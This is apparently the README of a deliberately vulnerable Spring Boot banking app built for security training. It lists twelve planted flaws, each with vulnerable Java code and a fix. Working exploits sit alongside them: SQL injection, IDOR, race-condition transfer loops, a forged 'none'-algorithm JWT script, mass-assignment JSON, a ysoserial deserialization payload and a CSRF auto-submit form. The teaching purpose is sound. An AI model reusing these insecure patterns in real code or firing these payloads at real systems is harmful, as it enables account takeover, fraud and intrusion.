# SecureBank - Educational Vulnerable Banking Platform 

![Version](https://img.shields.io/badge/version-1.0.0--VULNERABLE-red)
![Java](https://img.shields.io/badge/Java-17-orange)
![Spring Boot](https://img.shields.io/badge/Spring%20Boot-3.2.5-brightgreen)
![Status](https://img.shields.io/badge/status-Educational%20Only-yellow)

## ⚠️ WARNING

**This application contains INTENTIONAL security vulnerabilities for educational purposes.**

- **DO NOT deploy to production**
- **DO NOT use real customer data**
- **DO NOT expose to the internet**
- **USE ONLY in isolated training environments**

This project is designed for learning secure code review, penetration testing, and security awareness training.

---

## 📋 Table of Contents

- [Overview](#overview)
- [Architecture](#architecture)
- [Technology Stack](#technology-stack)
- [Setup Instructions](#setup-instructions)
- [Vulnerability Catalog](#vulnerability-catalog)
- [Exploit Guide](#exploit-guide)
- [Security Scanner](#security-scanner)
- [API Documentation](#api-documentation)
- [Educational Use](#educational-use)

---

## 🎯 Overview

SecureBank is a multi-tenant banking platform built with Spring Boot that intentionally implements 12 common security vulnerabilities. It serves as a hands-on learning tool for:

- **Security Engineers**: Practice vulnerability detection and remediation
- **Developers**: Learn secure coding practices through anti-patterns
- **Penetration Testers**: Test exploitation techniques in a legal environment
- **Security Trainers**: Demonstrate real-world vulnerabilities with working examples

### Features

- User authentication & authorization (JWT + OAuth2)
- Account management
- Fund transfers (domestic & wire)
- Loan application system
- API key management
- Multi-tenant architecture
- Audit logging
- Admin panel

---

## 🏗️ Architecture

### Multi-Module Maven Structure

```
securebank/
├── securebank-core/              # Domain models & repositories
│   ├── domain/                   # JPA entities
│   └── repository/               # Spring Data repositories
├── securebank-service/           # Business logic layer
│   └── service/                  # Service classes
├── securebank-auth/              # Authentication & security
│   ├── auth/                     # JWT & OAuth2 components
│   └── config/                   # Security configuration
├── securebank-api/               # REST API controllers
│   └── controller/               # REST endpoints
└── securebank-security-scanner/  # Custom static analyzer
    └── scanner/                  # JavaParser-based scanner
```

### Database Schema

**Tables:**
- `users` - User accounts with roles and tenant isolation
- `accounts` - Bank accounts with balances
- `transactions` - Transaction history
- `loans` - Loan applications and approvals
- `api_keys` - API keys for third-party integrations
- `oauth_clients` - OAuth2 client registrations
- `audit_logs` - Security audit trail

---

## 💻 Technology Stack

| Component | Technology | Version |
|-----------|-----------|---------|
| Language | Java | 17 |
| Framework | Spring Boot | 3.2.5 |
| Security | Spring Security | 6.x |
| Database | PostgreSQL | 12+ |
| ORM | Spring Data JPA | - |
| Migration | Liquibase | 4.25.1 |
| JWT | jjwt | 0.12.3 |
| Build Tool | Maven | 3.8+ |
| Documentation | SpringDoc OpenAPI | 2.3.0 |
| Static Analysis | JavaParser | 3.25.8 |

---

## 🚀 Setup Instructions

### Prerequisites

- Java 17 or higher
- Maven 3.8+
- PostgreSQL 12+
- Git

### Database Setup

```bash
# Create PostgreSQL database
createdb securebank

# Create user
psql -c "CREATE USER securebank WITH PASSWORD 'securebank123';"
psql -c "GRANT ALL PRIVILEGES ON DATABASE securebank TO securebank;"
```

### Build & Run

```bash
# Clone repository
git clone <repository-url>
cd SecureBank

# Build all modules
mvn clean install

# Run application
cd securebank-api
mvn spring-boot:run
```

### Access Points

- **Application**: http://localhost:8080
- **API Docs**: http://localhost:8080/swagger-ui.html
- **Database**: localhost:5432/securebank

### Test Data

Run the exploit tests to create sample data:

```bash
mvn test -pl securebank-api
```

---

## 🔓 Vulnerability Catalog

### 1. SQL Injection (CWE-89) - CRITICAL

**Location**: `TransactionController.searchTransactions()`
**Line**: ~30

**Vulnerable Code**:
```java
@GetMapping("/search")
public List<Transaction> searchTransactions(@RequestParam String query) {
    String sql = "SELECT * FROM transactions WHERE description LIKE '%" + query + "%'";
    return entityManager.createNativeQuery(sql, Transaction.class).getResultList();
}
```

**Exploit**:
```bash
curl -X GET "http://localhost:8080/api/transactions/search?query=test' OR '1'='1"
```

**Impact**: Complete database compromise, data exfiltration, data modification

**Fix**: Use parameterized queries or JPA methods

---

### 2. Insecure Direct Object Reference - IDOR (CWE-639) - HIGH

**Location**: `AccountController.getAccount()`
**Line**: ~40

**Vulnerable Code**:
```java
@GetMapping("/accounts/{id}")
public Account getAccount(@PathVariable Long id) {
    return accountRepository.findById(id).orElseThrow();
    // No authorization check!
}
```

**Exploit**:
```bash
# User A accessing User B's account
curl -H "Authorization: Bearer <token>" \
     http://localhost:8080/api/accounts/999
```

**Impact**: Unauthorized access to sensitive financial data, privacy violation

**Fix**: Verify account ownership before returning data

---

### 3. Race Condition in Transfers (CWE-362) - HIGH

**Location**: `TransferService.processTransfer()`
**Line**: ~35

**Vulnerable Code**:
```java
@Transactional
public Transaction processTransfer(Long fromId, Long toId, BigDecimal amount) {
    Account from = accountRepository.findById(fromId).get();
    if (from.getBalance().compareTo(amount) >= 0) {
        // NO LOCKING - race condition window
        Thread.sleep(100);
        from.setBalance(from.getBalance().subtract(amount));
        // ...
    }
}
```

**Exploit**:
```bash
# Send 5 concurrent transfer requests
for i in {1..5}; do
    curl -X POST http://localhost:8080/api/transfers/domestic \
         -H "Authorization: Bearer <token>" \
         -H "Content-Type: application/json" \
         -d '{"fromAccountId":1,"toAccountId":2,"amount":80}' &
done
```

**Impact**: Account overdraft, double spending, financial loss

**Fix**: Use pessimistic locking with `@Lock(LockModeType.PESSIMISTIC_WRITE)`

---

### 4. JWT Algorithm Confusion (CWE-347) - CRITICAL

**Location**: `JwtTokenProvider.validateToken()`
**Line**: ~65

**Vulnerable Code**:
```java
public boolean validateToken(String token) {
    Jwts.parserBuilder()
        .setSigningKey(getSigningKey())
        .build()
        .parseClaimsJws(token); // Accepts "none" algorithm!
    return true;
}
```

**Exploit**:
```python
import base64
import json

header = {"alg": "none", "typ": "JWT"}
payload = {"sub": "999", "username": "admin", "role": "ADMIN", "tenantId": 1}

token = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=') + '.'
token += base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=') + '.'
print(token)
```

**Impact**: Complete authentication bypass, privilege escalation, impersonation

**Fix**: Add `.requireAlgorithm(SignatureAlgorithm.HS512.getValue())`

---

### 5. Mass Assignment (CWE-915) - HIGH

**Location**: `LoanController.applyForLoan()`
**Line**: ~30

**Vulnerable Code**:
```java
@PostMapping("/loans/apply")
public Loan applyForLoan(@RequestBody Loan loan) {
    loan.setUserId(getCurrentUserId());
    // Attacker can set status and approvedBy in JSON!
    return loanRepository.save(loan);
}
```

**Exploit**:
```bash
curl -X POST http://localhost:8080/api/loans/apply \
     -H "Authorization: Bearer <token>" \
     -H "Content-Type: application/json" \
     -d '{
       "amount": 100000,
       "interestRate": 0.01,
       "termMonths": 360,
       "status": "APPROVED",
       "approvedBy": 1
     }'
```

**Impact**: Business logic bypass, unauthorized loan approval, fraud

**Fix**: Use DTOs instead of entities, explicitly set restricted fields

---

### 6. Insecure Deserialization (CWE-502) - CRITICAL

**Location**: `SessionController.restoreSession()`
**Line**: ~25

**Vulnerable Code**:
```java
@PostMapping("/session/restore")
public ResponseEntity<?> restoreSession(@RequestParam String sessionData) {
    byte[] bytes = Base64.getDecoder().decode(sessionData);
    ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(bytes));
    UserSession session = (UserSession) ois.readObject(); // RCE vulnerability!
}
```

**Exploit**:
```bash
# Use ysoserial to create malicious payload
java -jar ysoserial.jar CommonsCollections6 'calc.exe' | base64
```

**Impact**: Remote Code Execution (RCE), complete system compromise

**Fix**: Use JSON serialization instead of Java serialization

---

### 7. Horizontal Privilege Escalation (CWE-639) - HIGH

**Location**: `UserController.updateUser()`
**Line**: ~35

**Vulnerable Code**:
```java
@PutMapping("/users/{userId}")
public ResponseEntity<?> updateUser(@PathVariable Long userId,
                                   @RequestBody UserUpdateRequest request) {
    // No check if userId matches authenticated user!
    User user = userRepository.findById(userId).orElseThrow();
    user.setEmail(request.getEmail());
    return ResponseEntity.ok(userRepository.save(user));
}
```

**Exploit**:
```bash
# User ID 5 updating User ID 10's email
curl -X PUT http://localhost:8080/api/users/10 \
     -H "Authorization: Bearer <token_user_5>" \
     -H "Content-Type: application/json" \
     -d '{"email": "hacked@example.com"}'
```

**Impact**: Account takeover, data manipulation, privacy violation

**Fix**: Verify userId matches authenticated user

---

### 8. Payment Amount Tampering (CWE-472) - MEDIUM

**Location**: `TransferController.domesticTransfer()`
**Line**: ~30

**Vulnerable Code**:
```java
@PostMapping("/domestic")
public ResponseEntity<?> domesticTransfer(@RequestBody TransferRequest request) {
    // Trusts amount from client without server-side validation
    Transaction transaction = transferService.processTransfer(
        request.getFromAccountId(),
        request.getToAccountId(),
        request.getAmount() // Client-controlled!
    );
}
```

**Impact**: Financial loss, manipulation of transaction amounts

**Fix**: Implement server-side amount validation and limits

---

### 9. CSRF in Fund Transfers (CWE-352) - HIGH

**Location**: `SecurityConfig.filterChain()`
**Line**: ~55

**Vulnerable Code**:
```java
@Bean
public SecurityFilterChain filterChain(HttpSecurity http) {
    http.csrf(csrf -> csrf.disable()); // CSRF disabled globally!
    // ...
}
```

**Exploit**:
```html
<!-- Malicious website -->
<form action="http://localhost:8080/api/transfers/domestic" method="POST">
    <input type="hidden" name="fromAccountId" value="1">
    <input type="hidden" name="toAccountId" value="999">
    <input type="hidden" name="amount" value="10000">
</form>
<script>document.forms[0].submit();</script>
```

**Impact**: Unauthorized fund transfers, account manipulation

**Fix**: Enable CSRF protection or use custom CSRF tokens

---

### 10. Tenant Isolation Failure (CWE-566) - HIGH

**Location**: `AccountRepository.findAll()`
**Line**: ~20

**Vulnerable Code**:
```java
public List<Account> findAll() {
    return accountRepository.findAll(); // Returns ALL accounts!
}
```

**Impact**: Cross-tenant data leakage, privacy violation, compliance breach

**Fix**: Always filter by tenantId in multi-tenant applications

---

### 11. Cryptographic Failure (CWE-327) - MEDIUM

**Location**: `ApiKeyService.generateKey()`
**Line**: ~30

**Vulnerable Code**:
```java
private final Random random = new Random(); // Predictable!

public String generateApiKey() {
    return "sk_" + random.nextLong();
}
```

**Impact**: Predictable API keys, unauthorized API access

**Fix**: Use `SecureRandom` for cryptographic operations

---

### 12. Audit Log Tampering (CWE-778) - MEDIUM

**Location**: `AuditService.logAction()`
**Line**: ~35

**Vulnerable Code**:
```java
public AuditLog logAction(String action, String resource) {
    // userId comes from JWT claims which can be forged
    Long userId = authService.getCurrentUserId();
    AuditLog log = AuditLog.builder()
        .userId(userId) // Can be manipulated via JWT
        .action(action)
        .build();
    return auditLogRepository.save(log);
}
```

**Impact**: Audit trail manipulation, non-repudiation failure

**Fix**: Use server-side verified user identity, not JWT claims

---

## 🧪 Exploit Guide

### Running Exploit Tests

The project includes comprehensive exploit tests that demonstrate each vulnerability:

```bash
# Run all exploit tests
mvn test -pl securebank-api

# Run specific exploit test
mvn test -pl securebank-api -Dtest=SQLInjectionExploitTest
mvn test -pl securebank-api -Dtest=IDORExploitTest
mvn test -pl securebank-api -Dtest=JWTAlgorithmConfusionExploitTest
mvn test -pl securebank-api -Dtest=MassAssignmentExploitTest
mvn test -pl securebank-api -Dtest=RaceConditionExploitTest
```

### Manual Testing

1. **Start the application**:
   ```bash
   mvn spring-boot:run -pl securebank-api
   ```

2. **Create a test user**:
   ```bash
   curl -X POST http://localhost:8080/api/auth/register \
        -H "Content-Type: application/json" \
        -d '{
          "username": "testuser",
          "email": "test@example.com",
          "password": "password123",
          "tenantId": 1
        }'
   ```

3. **Login and get JWT token**:
   ```bash
   curl -X POST http://localhost:8080/api/auth/login \
        -H "Content-Type: application/json" \
        -d '{
          "username": "testuser",
          "password": "password123"
        }'
   ```

4. **Test vulnerabilities** using the exploit examples above

---

## 🔍 Security Scanner

### Running the Scanner

The project includes a custom static analyzer that detects all vulnerabilities:

```bash
# Build the scanner
mvn clean package -pl securebank-security-scanner

# Run scanner on the project
java -jar securebank-security-scanner/target/securebank-security-scanner-1.0.0-VULNERABLE.jar .
```

### Scanner Output

```
==========================================================
  SecureBank Security Scanner
  Scanning for intentional security vulnerabilities...
==========================================================

==========================================================
  SCAN RESULTS
==========================================================

Total Findings: 25
  CRITICAL: 3
  HIGH: 18
  MEDIUM: 4

[1] SQL Injection (CWE-89)
    Severity: HIGH
    File: ./securebank-api/src/main/java/com/securebank/controller/TransactionController.java
    Line: 30
    Code: String sql = "SELECT * FROM transactions WHERE description LIKE '%" + query + "%'"
    Fix: SQL query built using string concatenation with user input. Use parameterized queries...

[2] JWT Algorithm Confusion (CWE-347)
    Severity: CRITICAL
    File: ./securebank-auth/src/main/java/com/securebank/auth/JwtTokenProvider.java
    Line: 70
    Code: parseClaimsJws(token)
    Fix: JWT validation doesn't verify the algorithm. Add .requireAlgorithm()...

...
```

### Scanner Features

- Detects all 12 vulnerability types
- Provides file path and line number
- Shows code snippet
- Includes remediation advice
- Groups by severity (CRITICAL, HIGH, MEDIUM)

---

## 📚 API Documentation

### Authentication Endpoints

| Method | Endpoint | Description |
|--------|----------|-------------|
| POST | `/api/auth/register` | Register new user |
| POST | `/api/auth/login` | Login and get JWT token |

### Account Endpoints

| Method | Endpoint | Description | Vulnerability |
|--------|----------|-------------|---------------|
| POST | `/api/accounts` | Create new account | - |
| GET | `/api/accounts/{id}` | Get account details | **IDOR** |
| GET | `/api/accounts/{id}/transactions` | Get transactions | **IDOR** |
| GET | `/api/accounts/my-accounts` | Get current user's accounts | - |

### Transfer Endpoints

| Method | Endpoint | Description | Vulnerability |
|--------|----------|-------------|---------------|
| POST | `/api/transfers/domestic` | Domestic transfer | **Race Condition, CSRF** |
| POST | `/api/transfers/wire` | Wire transfer | **Race Condition, CSRF** |

### Transaction Endpoints

| Method | Endpoint | Description | Vulnerability |
|--------|----------|-------------|---------------|
| GET | `/api/transactions/search?query=X` | Search transactions | **SQL Injection** |
| GET | `/api/transactions/{id}` | Get transaction | - |

### Loan Endpoints

| Method | Endpoint | Description | Vulnerability |
|--------|----------|-------------|---------------|
| POST | `/api/loans/apply` | Apply for loan | **Mass Assignment** |
| POST | `/api/loans/{id}/approve` | Approve loan | - |
| GET | `/api/loans/my-loans` | Get user's loans | - |

### Full API Documentation

Access Swagger UI at: http://localhost:8080/swagger-ui.html

---

## 🎓 Educational Use

### For Security Trainers

1. **Code Review Training**: Have students review the code and identify vulnerabilities
2. **Threat Modeling**: Analyze attack vectors and data flows
3. **Secure Coding**: Compare vulnerable vs. secure implementations
4. **Testing**: Write security tests and exploit PoCs

### For Developers

1. **Anti-Patterns**: Learn what NOT to do
2. **Secure Alternatives**: Compare with fixed implementations
3. **Defense in Depth**: Understand multiple layers of security
4. **Compliance**: Map vulnerabilities to standards (OWASP, CWE, PCI-DSS)

### For Penetration Testers

1. **Safe Testing**: Practice exploitation in a legal environment
2. **Tool Testing**: Test SAST/DAST tools against known vulnerabilities
3. **Report Writing**: Document findings professionally
4. **Remediation**: Provide actionable fixes

### Learning Paths

**Beginner**: Start with IDOR and SQL Injection
**Intermediate**: Race conditions, JWT attacks, Mass Assignment
**Advanced**: Deserialization, Audit log tampering, Tenant isolation

---

## 🔧 Branches

- `main`: Vulnerable version (current)
- `secure`: Fixed version with all vulnerabilities remediated
- `exploits`: Standalone exploit scripts and tools

---

## 📝 License

This project is for educational purposes only. Use at your own risk.

---

## 🤝 Contributing

Contributions for educational improvements welcome:

- Additional vulnerabilities
- Better exploit demonstrations
- Improved documentation
- Translation to other languages

---

## 📞 Support

For questions or issues:
- Open a GitHub issue
- Check the documentation
- Review the exploit tests

---

## ⚖️ Legal Disclaimer

This software is provided for educational purposes only. The authors and contributors are not responsible for any misuse or damage caused by this software. Always obtain proper authorization before testing security vulnerabilities on any system you do not own.

---

**Remember**: Never use vulnerable code in production. Always follow secure coding practices and implement defense in depth.

---

Built with ❤️ for security education
